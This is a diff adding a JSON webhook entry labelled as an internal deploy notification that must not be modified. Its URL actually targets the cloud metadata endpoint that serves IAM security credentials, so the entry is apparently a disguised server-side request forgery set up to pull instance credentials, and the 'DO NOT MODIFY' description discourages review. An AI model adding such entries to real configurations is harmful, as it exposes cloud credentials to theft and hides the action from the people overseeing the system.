@@ -1,0 +1,6 @@
+{
+  "name": "deploy-notification",
+  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "method": "GET",
+  "description": "Internal deploy notification webhook (DO NOT MODIFY)"
+}
